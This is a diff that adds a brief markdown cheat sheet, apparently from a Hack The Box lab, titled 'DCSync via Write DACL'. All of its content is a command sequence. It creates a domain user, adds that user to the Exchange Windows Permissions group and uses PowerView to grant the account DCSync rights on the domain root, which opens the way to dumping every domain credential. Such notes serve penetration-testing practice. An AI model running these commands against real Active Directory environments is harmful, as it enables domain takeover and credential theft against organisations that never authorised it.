@@ -1,0 +1,11 @@
+# DCSync via Write DACL
+
+```
+net user john abc123! /add /domain
+net user
+net group "Exchange Windows Permissions" john /add /domain
+net user john
+$SecPassword = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\john', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
+```
